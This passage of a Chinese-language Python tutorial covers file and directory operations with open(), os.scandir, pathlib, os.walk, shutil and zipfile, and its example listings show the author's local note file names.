class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#39;r&#39;： 以只读模式打开（缺省模式，必须保证文件存在）</span><br><span class="line">&#39;w&#39;：以只写模式打开。若文件存在，则清空文件，然后重新创建；若不存在，则新建</span><br><span class="line">&#39;a&#39;：以追加模式打开。若文件存在，则会追加到文件的末尾；若文件不存在，则新建</span><br><span class="line"></span><br><span class="line">常见的mode组合</span><br><span class="line">&#39;r&#39;或&#39;rt&#39;：   默认模式，文本读模式</span><br><span class="line">&#39;w&#39;或&#39;wt&#39;：以文本写模式打开（打开前文件被清空）</span><br><span class="line">&#39;rb&#39;：       以二进制读模式打开</span><br><span class="line">&#39;ab&#39;：      以二进制追加模式打开</span><br><span class="line">&#39;wb&#39;：      以二进制写模式打开（打开前文件被清空）</span><br><span class="line">&#39;r+&#39;：       以文本读写模式打开，默认写的指针开始指在文件开头, 因此会覆写文件</span><br><span class="line">&#39;w+&#39;：      以文本读写模式打开（打开前文件被清空）</span><br><span class="line">&#39;a+&#39;：      以文本读写模式打开（只能写在文件末尾）</span><br><span class="line">&#39;rb+&#39;：     以二进制读写模式打开</span><br><span class="line">&#39;wb+&#39;：   以二进制读写模式打开（打开前被清空）</span><br><span class="line">&#39;ab+&#39;：    以二进制读写模式打开</span><br></pre></td></tr></table></figure></li></ul><h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;data.txt&#39;, &#39;r&#39;) as f:</span><br><span class="line">    data &#x3D; f.read()</span><br><span class="line">    print(&#39;context: &#123;&#125;&#39;.format(data))</span><br></pre></td></tr></table></figure><ul><li><p>file.read([size])<br>从文件读取指定的字节数，如果未给定或为负则读取所有。</p></li><li><p>file.readline([size])<br>读取整行，包括 “\n” 字符，readline()读取第一行就返回，再次调用f.readline()，会读取下一行。</p></li><li><p>file.readlines([sizeint])</p><p>常与for循环和strip()去掉换行符配合。</p><p>读取所有行并返回列表，若给定sizeint&gt;0，则是设置一次读多少字节，这是为了减轻读取压力。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">47</span>]: <span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     print(f.read())</span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> everything.</span><br><span class="line">python <span class="keyword">is</span> a cat.</span><br><span class="line">this <span class="keyword">is</span> the end.</span><br><span class="line"></span><br><span class="line">In [<span class="number">48</span>]: <span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     print(f.readlines())</span><br><span class="line">[<span class="string">&#x27;1 is everything.\n&#x27;</span>, <span class="string">&#x27;python is a cat.\n&#x27;</span>, <span class="string">&#x27;this is the end.&#x27;</span>]</span><br><span class="line">In [<span class="number">49</span>]: <span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     print(f.readline())</span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> everything.</span><br><span class="line">In [<span class="number">61</span>]: <span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    ...:         print(line)</span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> everything.</span><br><span class="line"></span><br><span class="line">python <span class="keyword">is</span> a cat.</span><br><span class="line"></span><br><span class="line">this <span class="keyword">is</span> the end.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取内容包含换行符，所以要strip()去掉换行符</span></span><br><span class="line">In [<span class="number">62</span>]: <span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    ...:         print(line.strip())</span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> everything.</span><br><span class="line">python <span class="keyword">is</span> a cat.</span><br><span class="line">this <span class="keyword">is</span> the end.</span><br></pre></td></tr></table></figure><h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;data.txt&#39;, &#39;w&#39;) as f:</span><br><span class="line">    data &#x3D; &#39;some data to be written to the file&#39;</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure><h4 id="获取目录列表"><a href="#获取目录列表" class="headerlink" title="获取目录列表"></a>获取目录列表</h4><h5 id="os-scandir"><a href="#os-scandir" class="headerlink" title="os.scandir()"></a>os.scandir()</h5><p><code>os.scandir()</code> 调用时返回一个迭代器而不是一个列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">entries &#x3D; os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)</span><br><span class="line">print(entries)</span><br><span class="line"># &lt;posix.ScandirIterator at 0x105b4d4b0&gt;</span><br></pre></td></tr></table></figure><p>ScandirIterator 指向了当前目录中的所有条目。你可以遍历迭代器的内容，并打印文件名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">with os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;) as entries:</span><br><span class="line">    for entry in entries:</span><br><span class="line">        print(entry.name)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop python3 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py</span><br><span class="line">.DS_Store</span><br><span class="line">阅读笔记.md</span><br><span class="line">.localized</span><br><span class="line">常用操作</span><br><span class="line">huazhu.com.csv</span><br><span class="line">huazhu_url.txt</span><br><span class="line">code</span><br><span class="line">steady-learn</span><br><span class="line">vulhub-master</span><br><span class="line">未命名 2.txt</span><br><span class="line">PHP木马.md</span><br><span class="line">java基础.md</span><br><span class="line">1.py</span><br><span class="line">makedown</span><br><span class="line">SQL server.md</span><br><span class="line">开发学习</span><br><span class="line">sqlmap使用以及学习.md</span><br><span class="line">SQL注入漏洞挖掘.md</span><br><span class="line">IPC.md</span><br><span class="line">Python爬虫.md</span><br><span class="line">漏洞盒子</span><br></pre></td></tr></table></figure><p>这里 <code>os.scandir()</code> 和with语句一起使用，因为它支持上下文管理协议。使用上下文管理器关闭迭代器并在迭代器耗尽后自动释放获取的资源。</p><h5 id="pathlib"><a href="#pathlib" class="headerlink" title="pathlib"></a>pathlib</h5><p>获取目录列表的方法是使用 <code>pathlib</code> 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pathlib import Path</span><br><span class="line"></span><br><span class="line">entries &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)</span><br><span class="line">for entry in entries.iterdir():</span><br><span class="line">    print(entry.name)</span><br></pre></td></tr></table></figure><p><code>pathlib.Path()</code> 返回的是 <code>PosixPath</code> 或 <code>WindowsPath</code> 对象，这取决于操作系统。</p><p><code>pathlib.Path()</code> 对象有一个 <code>.iterdir()</code> 的方法用于创建一个迭代器包含该目录下所有文件和目录。由 <code>.iterdir()</code> 生成的每个条目都包含文件或目录的信息，例如其名称和文件属性。<code>pathlib</code> 在Python3.4时被第一次引入，并且是对Python一个很好的加强，它为文件系统提供了面向对象的接口。</p><p>在上面的例子中，你调用 <code>pathlib.Path()</code> 并传入了一个路径参数。然后调用 <code>.iterdir()</code> 来获取 <code>my_directory</code> 下的所有文件和目录列表。</p><p>总结</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>os.listdir()</td><td>以列表的方式返回目录中所有的文件和文件夹</td></tr><tr><td>os.scandir()</td><td>返回一个迭代器包含目录中所有的对象，对象包含文件属性信息</td></tr><tr><td>pathlib.Path().iterdir()</td><td>返回一个迭代器包含目录中所有的对象，对象包含文件属性信息</td></tr></tbody></table><h4 id="获取目录中的文件"><a href="#获取目录中的文件" class="headerlink" title="获取目录中的文件"></a>获取目录中的文件</h4><p>打印出目录中文件的名称。为了过滤目录并仅列出 <code>os.listdir()</code> 生成的目录列表的文件，要使用 <code>os.path</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">basepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;</span><br><span class="line">for entry in os.listdir(basepath):</span><br><span class="line">    # 使用os.path.isfile判断该路径是否是文件类型</span><br><span class="line">    if os.path.isfile(os.path.join(basepath, entry)):</span><br><span class="line">        print(entry)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python3 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py</span><br><span class="line">.DS_Store</span><br><span class="line">阅读笔记.md</span><br><span class="line">.localized</span><br><span class="line">huazhu.com.csv</span><br><span class="line">huazhu_url.txt</span><br><span class="line">未命名 2.txt</span><br><span class="line">PHP木马.md</span><br><span class="line">java基础.md</span><br><span class="line">1.py</span><br><span class="line">SQL server.md</span><br><span class="line">sqlmap使用以及学习.md</span><br><span class="line">SQL注入漏洞挖掘.md</span><br><span class="line">IPC.md</span><br><span class="line">Python爬虫.md</span><br></pre></td></tr></table></figure><p>在这里调用 <code>os.listdir()</code> 返回指定路径中所有内容的列表，接着使用 <code>os.path.isfile()</code> 过滤列表让其只显示文件类型而非目录类型。</p><p>一个更简单的方式来列出一个目录中所有的文件是使用 <code>os.scandir()</code> 或 <code>pathlib.Path()</code> :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">basepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;</span><br><span class="line">with os.scandir(basepath) as entries:</span><br><span class="line">    for entry in entries:</span><br><span class="line">        if entry.is_file():</span><br><span class="line">            print(entry.name)</span><br></pre></td></tr></table></figure><p><code>pathlib.Path()</code> 列出一个目录中的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pathlib import Path</span><br><span class="line"></span><br><span class="line">basepath &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)</span><br><span class="line">for entry in basepath.iterdir():</span><br><span class="line">    if entry.is_file():</span><br><span class="line">        print(entry.name)</span><br></pre></td></tr></table></figure><h4 id="列出子目录"><a href="#列出子目录" class="headerlink" title="列出子目录"></a>列出子目录</h4><p><code>os.listdir()</code> 和 <code>os.path()</code> :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">basepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;</span><br><span class="line">for entry in os.listdir(basepath):</span><br><span class="line">    if os.path.isdir(os.path.join(basepath, entry)):</span><br><span class="line">        print(entry)</span><br></pre></td></tr></table></figure><p><code>os.scandir()</code> ：</p><p><code>is_dir()</code> 返回 True，否侧返回False</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">basepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;</span><br><span class="line">with os.scandir(basepath) as entries:</span><br><span class="line">    for entry in entries:</span><br><span class="line">        if entry.is_dir():</span><br><span class="line">            print(entry.name)</span><br></pre></td></tr></table></figure><p><code>pathlib.Path()</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pathlib import Path</span><br><span class="line"></span><br><span class="line">basepath &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)</span><br><span class="line">for entry in basepath.iterdir():</span><br><span class="line">    if entry.is_dir():</span><br><span class="line">        print(entry.name)</span><br></pre></td></tr></table></figure><p>在 <code>.iterdir()</code> 迭代器返回的每一项上调用 <code>is_dir()</code> 检查是文件还是目录。</p><h4 id="获取文件属性"><a href="#获取文件属性" class="headerlink" title="获取文件属性"></a>获取文件属性</h4><p><code>os.scandir()</code> 和 <code>pathlib.Path()</code> 能直接获取到包含文件属性的目录列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">with os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;) as entries:</span><br><span class="line">    for entry in entries:</span><br><span class="line">        info &#x3D; entry.stat()</span><br><span class="line">        print(info.st_mtime)       </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">1548163662.3952665</span><br><span class="line">1548163689.1982062</span><br><span class="line">1548163697.9175904</span><br><span class="line">1548163721.1841028</span><br><span class="line">1548163740.765162</span><br><span class="line">1548163769.4702623</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><code>os.scandir()</code> 返回一个 <code>ScandirIterator</code> 对象。<code>ScandirIterator</code> 对象中的每一项有 <code>.stat()</code> 方法能获取关于它指向文件或目录的信息。</p><p><code>.stat()</code> 提供了例如文件大小和最后修改时间的信息。</p><h4 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h4><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>os.mkdir()</td><td>创建单个子目录</td></tr><tr><td>os.makedirs()</td><td>创建多个目录，包括中间目录</td></tr><tr><td>Pathlib.Path.mkdir()</td><td>创建单个或多个目录</td></tr></tbody></table><h5 id="创建单个目录"><a href="#创建单个目录" class="headerlink" title="创建单个目录"></a>创建单个目录</h5><p>要创建单个目录，把目录路径作为参数传给 <code>os.mkdir()</code> :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">&#x27;/steady/1.php&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果该目录已经存在，<code>os.mkdir()</code> 将抛出 <code>FileExistsError</code> 异常。或者，你也可以使用 <code>pathlib</code> 来创建目录:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">p = Path(<span class="string">&#x27;example_directory&#x27;</span>)</span><br><span class="line">p.mkdir()</span><br></pre></td></tr></table></figure><p>如果路径已经存在，<code>mkdir()</code> 会抛出 <code>FileExistsError</code> 异常:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileExistsError: [Errno 17] File exists: &#39;example_directory&#39;</span><br></pre></td></tr></table></figure><p>为了避免像这样的错误抛出， 当发生错误时捕获错误并让你的用户知道:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">p = Path(<span class="string">&#x27;example_directory&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p.mkdir()</span><br><span class="line"><span class="keyword">except</span> FileExistsError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><h5 id="创建多个目录"><a href="#创建多个目录" class="headerlink" title="创建多个目录"></a>创建多个目录</h5><p>os.makedirs() 和 os.mkdir() 类似。两者之间的区别在于，os.makedirs() 不仅可以创建单独的目录，还可以递归的创建目录树。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.makedirs(<span class="string">&#x27;2018/10/05&#x27;</span>, mode=<span class="number">0o770</span>)</span><br></pre></td></tr></table></figure><p>上述代码创建了 <code>2018/10/05</code> 的目录结构并为所有者和组用户提供读、写和执行权限。默认的模式为 <code>0o777</code> ，增加了其他用户组的权限。</p><h4 id="遍历目录和处理文件"><a href="#遍历目录和处理文件" class="headerlink" title="遍历目录和处理文件"></a>遍历目录和处理文件</h4><p>Python函数 <code>os.walk()</code> 来实现这一功能。<code>os.walk()</code> 用于通过从上到下或从下到上遍历树来生成目录树中的文件名。</p><p><code>os.walk()</code> 默认是从上到下遍历目录:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> dirpath, dirname, files <span class="keyword">in</span> os.walk(<span class="string">&#x27;目录位置&#x27;</span>):</span><br><span class="line">   print(<span class="string">f&#x27;Found directory: <span class="subst">&#123;dirpath&#125;</span>&#x27;</span>)</span><br><span class="line">   <span class="keyword">for</span> file_name <span class="keyword">in</span> files:</span><br><span class="line">       print(file_name)</span><br></pre></td></tr></table></figure><p><code>os.walk()</code> 在每个循环中返回三个值：</p><ol><li>当前文件夹的名称</li><li>当前文件夹中子文件夹的列表</li><li>当前文件夹中文件的列表</li></ol><p>在每次迭代中，会打印出它找到的子目录和文件的名称：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Found directory: /Users/apple/Desktop/steady-learn/笔记/漏洞原理/SQL/Mysql注入学习/sql注入题</span><br><span class="line">.DS_Store</span><br><span class="line">SQL注入-<span class="number">-8.</span>md</span><br><span class="line">SQL注入-<span class="number">-3.</span>md</span><br><span class="line">SQL注入-<span class="number">-6.</span>md</span><br><span class="line">SQL注入-<span class="number">-2.</span>md</span><br><span class="line">SQL注入-<span class="number">-5.</span>md</span><br><span class="line">SQL注入-<span class="number">-1.</span>md</span><br><span class="line">SQL注入-<span class="number">-4.</span>md</span><br><span class="line">Found directory: /Users/apple/Desktop/steady-learn/笔记/漏洞原理/SQL/Mysql注入学习/sql注入</span><br><span class="line">SQL注入--过滤空格.md</span><br><span class="line">SQL注入--过滤<span class="keyword">and</span>、<span class="keyword">or</span>.md</span><br><span class="line">.DS_Store</span><br><span class="line">SQL注入--字符型和数字型注入的判断.md</span><br></pre></td></tr></table></figure><h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><h5 id="shutil-copy"><a href="#shutil-copy" class="headerlink" title="shutil.copy()"></a>shutil.copy()</h5><p>使用<code>shutil.copy()</code> 将文件从一个位置复制到另一个位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import shutil</span><br><span class="line"></span><br><span class="line">src &#x3D; &#39;path&#x2F;to&#x2F;file.txt&#39;</span><br><span class="line">dst &#x3D; &#39;path&#x2F;to&#x2F;dest_dir&#39;</span><br><span class="line">shutil.copy(src, dst)</span><br></pre></td></tr></table></figure><p> <code>shutil.copy(src，dst)</code> 会将文件 <code>src</code> 复制到 <code>dst</code> 中指定的位置。 如果 <code>dst</code> 是文件，则该文件的内容将替换为 <code>src</code> 的内容。 如果 <code>dst</code> 是目录，则 <code>src</code> 将被复制到该目录中。 <code>shutil.copy()</code> 仅复制文件的内容和文件的权限。 其他元数据（如文件的创建和修改时间）不会保留。</p><h5 id="shutil-copy2"><a href="#shutil-copy2" class="headerlink" title="shutil.copy2()"></a>shutil.copy2()</h5><p>复制时保留所有文件元数据</p><h4 id="移动文件和目录"><a href="#移动文件和目录" class="headerlink" title="移动文件和目录"></a>移动文件和目录</h4><p>要将文件或目录移动到其他位置，请使用 <code>shutil.move(src，dst)</code> 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import shutil</span><br><span class="line">dst &#x3D; shutil.move(&#39;dir_1&#x2F;&#39;, &#39;backup&#x2F;&#39;)</span><br><span class="line">print(dst)  # &#39;backup&#39;</span><br></pre></td></tr></table></figure><p>如果 <code>backup/</code> 存在，则 <code>shutil.move(&#39;dir_1/&#39;，&#39;backup/&#39;)</code> 将 <code>dir_1/</code> 移动到 <code>backup/</code> 。 如果 <code>backup/</code> 不存在，则 <code>dir_1/</code> 将重命名为 <code>backup</code> 。</p><h4 id="重命名文件和目录"><a href="#重命名文件和目录" class="headerlink" title="重命名文件和目录"></a>重命名文件和目录</h4><p>Python包含用于重命名文件和目录的 <code>os.rename(src，dst)</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.rename(&#39;first.zip&#39;, &#39;first_01.zip&#39;)</span><br></pre></td></tr></table></figure><p>上面的行将 <code>first.zip</code> 重命名为 <code>first_01.zip</code> 。 如果目标路径指向目录，则会抛出 <code>OSError</code> 。</p><h4 id="读取ZIP文件"><a href="#读取ZIP文件" class="headerlink" title="读取ZIP文件"></a>读取ZIP文件</h4><p>zipfile 模块是一个底层模块，是Python标准库的一部分。 zipfile 具有可以轻松打开和提取ZIP文件的函数。 要读取ZIP文件的内容，首先要做的是创建一个 ZipFile 对象。ZipFile 对象类似于使用 open() 创建的文件对象。ZipFile 也是一个上下文管理器，因此支持with语句：</p><p>打开ZIP文件后，可以通过 <code>zipfile</code> 模块提供的函数访问有关存档文件的信息。</p><p>要获取存档文件中的文件列表，请在 <code>ZipFile</code> 对象上调用 <code>namelist()</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">with zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;) as fp:</span><br><span class="line">    a&#x3D;fp.namelist()</span><br><span class="line">    for i in a:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure><p><code>.namelist()</code> 返回存档文件中文件和目录的名称列表。要检索有关存档文件中文件的信息，使用 <code>.getinfo()</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">with zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;) as zipobj:</span><br><span class="line">    bar_info &#x3D; zipobj.getinfo(&#39;makedown&#x2F;8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC.png&#39;)</span><br><span class="line">    print(bar_info.file_size)</span><br></pre></td></tr></table></figure><p><code>.getinfo()</code> 返回一个 <code>ZipInfo</code> 对象，该对象存储有关存档文件的单个成员的信息。 要获取有关存档文件中文件的信息，请将其路径作为参数传递给 <code>.getinfo()</code> 。 使用 <code>getinfo()</code> ，你可以检索有关存档文件成员的信息，例如上次修改文件的日期，压缩大小及其完整文件名。 访问 <code>.file_size</code> 将以字节为单位检索文件的原始大小。</p><h4 id="提取ZIP文件"><a href="#提取ZIP文件" class="headerlink" title="提取ZIP文件"></a>提取ZIP文件</h4><p><code>zipfile</code> 模块允许你通过 <code>.extract()</code> 和 <code>.extractall()</code> 从ZIP文件中提取一个或多个文件。</p><p>默认情况下，这些方法将文件提取到当前目录。 它们都采用可选的路径参数，允许指定要将文件提取到的其他指定目录。 如果该目录不存在，则会自动创建该目录。 要从压缩文件中提取文件，请执行以下操作：</p><p>提取所有文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import os</span><br><span class="line">data_zip &#x3D; zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;)</span><br><span class="line">data_zip.extractall(path&#x3D;&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1&#39;)</span><br></pre></td></tr></table></figure><p>提取某一个文件到当前目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data_zip.extract(&#39;file1.py&#39;)</span><br></pre></td></tr></table></figure><h4 id="从加密的文档提取数据"><a href="#从加密的文档提取数据" class="headerlink" title="从加密的文档提取数据"></a>从加密的文档提取数据</h4><p>zipfile 支持提取受密码保护的ZIP。 要提取受密码保护的ZIP文件，请将密码作为参数传递给 .extract() 或.extractall() 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import zipfile</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; with 